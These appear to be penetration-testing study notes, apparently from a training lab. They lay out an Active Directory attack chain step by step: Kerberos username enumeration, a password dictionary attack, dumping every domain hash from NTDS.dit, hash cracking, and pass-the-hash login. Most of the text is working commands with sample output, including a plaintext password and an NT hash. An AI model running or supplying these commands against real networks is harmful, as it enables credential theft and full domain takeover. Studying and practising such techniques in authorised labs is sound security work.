- Goal: get NTDS.dit from the Domain Controller = every domain user's hash = compromise the whole domain
- Needs admin/domain admin rights on the DC, so this is usually a later step, not the first move

---
## Step 1: Build a username list (if we don't have one)
- guess the org's naming convention from known emails (`jdoe@company.com` -> username is likely `jdoe`)
- common patterns: `firstinitiallastname`, `firstname.lastname`, `lastname.firstname`
- automate with `username-anarchy` if we only have real names

## Step 2: Confirm which usernames are real (before wasting attempts guessing passwords)
```bash
kerbrute userenum --dc <dc-ip> --domain inlanefreight.local usernames.txt

# Example output
[+] VALID USERNAME:  [bwilliamson@inlanefreight.local](mailto:bwilliamson@inlanefreight.local)
```
- this doesn't need a password at all, just checks if the username exists against Kerberos, much quieter than a login attempt

---
## Step 3: Dictionary attack against confirmed usernames
```bash
netexec smb <dc-ip> -u bwilliamson -p fasttrack.txt
```
- can lock the account out if a lockout policy is set, go slow/careful
- `(Pwn3d!)` tag = creds have admin rights on that host, not just valid login

---
## Step 4: Once we have Domain Admin creds, grab NTDS.dit
- Fast way, one command with netexec:
```bash
netexec smb <dc-ip> -u bwilliamson -p 'P@55w0rd!' -M ntdsutil

# Example Output
[+] inlanefrieght.local\bwilliamson:P@55w0rd! (Pwn3d!)  
Administrator:500:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::  
krbtgt:502:...  
[+] Dumped 61 NTDS hashes
```

- this dumps every single domain account's NT hash in one shot, `krbtgt` account is especially valuable later (golden ticket attacks, covered elsewhere)

- Manual way (if netexec's module isn't available): `vssadmin` to shadow-copy C:, copy NTDS.dit + SYSTEM off it, transfer to attack box, then `secretsdump.py -ntds NTDS.dit -system SYSTEM LOCAL`

---
## Step 5: Crack or Pass-the-Hash
```bash
hashcat -m 1000 <hash> rockyou.txt
```
- if it doesn't crack, we can often still use the hash directly to log in (don't need the plaintext password):
```bash
evil-winrm -i <dc-ip> -u Administrator -H <nt-hash>
```
- this is Pass-the-Hash (PtH), works because Windows NTLM auth accepts the hash itself as proof of identity